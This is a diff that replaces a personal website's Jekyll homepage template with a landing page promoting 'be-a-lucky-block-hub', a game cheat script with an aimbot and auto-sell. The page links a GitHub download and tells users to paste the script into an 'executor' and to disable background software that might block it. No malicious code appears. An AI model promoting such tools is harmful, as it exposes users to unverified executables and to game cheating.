@@ -1,30 +1,80 @@
----
-layout: site
-title: Home
----
-{% assign current_lang = page.lang | default: site.languages.default %}
-{% assign t = site.data.locales[current_lang] %}
-{% assign projects_only = site.pages | where: 'type', 'project' %}
-{% assign articles_only = site.pages | where: 'type', 'article' %}
-{% assign lang_entries = projects_only | concat: articles_only | where: 'lang', current_lang %}
-<div class="profile">
-  {% if site.author.avatar and site.author.avatar != '' %}<img class="profile-photo" src="{{ site.author.avatar | relative_url }}" alt="{{ site.author.name }} {{ t.accessibility.profile_photo_suffix }}">{% endif %}
-  <div>
-    {% if site.author.name and site.author.name != '' %}<h1>{{ site.author.name }}</h1>{% endif %}
-    {% if site.author.role != '' or site.author.education != '' or site.author.location != '' %}<p>{% if site.author.role and site.author.role != '' %}<b>{{ site.author.role }}.</b>{% endif %} {% if site.author.education and site.author.education != '' %}<b>{{ site.author.education }}.</b>{% endif %} {% if site.author.location and site.author.location != '' %}<b>{{ site.author.location }}.</b>{% endif %}</p>{% endif %}
-    {% if site.author.email and site.author.email != '' %}<p class="small"><a href="mailto:{{ site.author.email }}">{{ site.author.email }}</a></p>{% endif %}
-  </div>
-</div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Guide for using the be-a-lucky-block-hub script for automated gameplay.">
+    <title>be-a-lucky-block-hub - Automate your gameplay with ease</title>
+</head>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f4f4f4;">
 
-<h2 class="section-title">{{ t.home.about_title }}</h2>
-<div class="about-text">{% for paragraph in t.about %}<p>{{ paragraph }}</p>{% endfor %}</div>
+    <h1 style="font-size: 2.5em; color: #2c3e50;">📦 be-a-lucky-block-hub - Automate your gameplay with ease</h1>
 
-{% if lang_entries.size > 0 %}
-<h2 class="section-title">{{ t.home.recent_title }}</h2>
-<p class="section-intro">{{ t.home.recent_intro }}</p>
-<div class="recent-list">
-  {% assign recent = lang_entries | sort: 'date' | reverse %}
-  {% for entry in recent limit: site.appearance.recent_items_on_home %}{% include recent-entry.html item=entry %}{% endfor %}
-</div>
-<p class="more-link"><a href="{{ t.home.archive_url | relative_url }}">{{ t.home.archive_link }}</a></p>
-{% endif %}
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/zerovia/be-a-lucky-block-hub" style="background-color: #555; color: #fff; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 1.2em; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Hub Files Now</a>
+    </div>
+
+    <section style="background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
+        <h2 style="color: #2c3e50;">📖 Project Overview</h2>
+        <p>This script improves your experience in Be A Lucky Block. It focuses on speed and simple inputs. You use this tool to manage your game items and target objects without manual effort. The hub handles the repetitive clicking and selling tasks for you.</p>
+    </section>
+
+    <section style="background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-top: 20px;">
+        <h2 style="color: #2c3e50;">🚀 Getting Started</h2>
+        <p>Follow these steps to set up the software on your Windows computer.</p>
+        <ol>
+            <li>Visit the <a href="https://github.com/zerovia/be-a-lucky-block-hub">official project page</a> to find the download link.</li>
+            <li>Click the green Code button and select Download ZIP.</li>
+            <li>Save the file to your desktop for easy access.</li>
+            <li>Right-click the downloaded folder and select Extract All.</li>
+        </ol>
+    </section>
+
+    <section style="background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-top: 20px;">
+        <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+        <ul>
+            <li>Operating System: Windows 10 or Windows 11.</li>
+            <li>Browser: Latest version of Google Chrome or Microsoft Edge.</li>
+            <li>Active internet connection.</li>
+            <li>A compatible gaming executor software.</li>
+        </ul>
+    </section>
+
+    <section style="background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-top: 20px;">
+        <h2 style="color: #2c3e50;">🎮 Features</h2>
+        <p>The hub provides several functions to assist your play style:</p>
+        <ul>
+            <li><strong>Aimbot:</strong> Adjusts your view to track targets near lucky blocks.</li>
+            <li><strong>Auto-sell:</strong> Converts your collected items into currency automatically.</li>
+            <li><strong>Quick Execution:</strong> Processes input commands with low latency.</li>
+            <li><strong>Simple Menu:</strong> Toggles functions with a single mouse click.</li>
+        </ul>
+    </section>
+
+    <section style="background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-top: 20px;">
+        <h2 style="color: #2c3e50;">🔧 How to Run Settings</h2>
+        <ol>
+            <li>Launch your primary executor program.</li>
+            <li>Copy the script contents from the extracted folder.</li>
+            <li>Paste the data into your executor script editor.</li>
+            <li>Press the Execute button within your executor interface.</li>
+            <li>Return to the game to view the interface overlay.</li>
+        </ol>
+    </section>
+
+    <section style="background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-top: 20px;">
+        <h2 style="color: #2c3e50;">💡 Troubleshooting</h2>
+        <p>If the script fails to load, check the following items:</p>
+        <ul>
+            <li>Ensure your executor remains updated to the latest version.</li>
+            <li>Disable background software that might block inputs.</li>
+            <li>Restart your game client and try the execution again.</li>
+        </ul>
+    </section>
+
+    <footer style="margin-top: 40px; font-size: 0.9em; color: #777;">
+        <p>Keywords: script, gaming, lucky block, automation, windows, tool</p>
+    </footer>
+
+</body>
+</html>
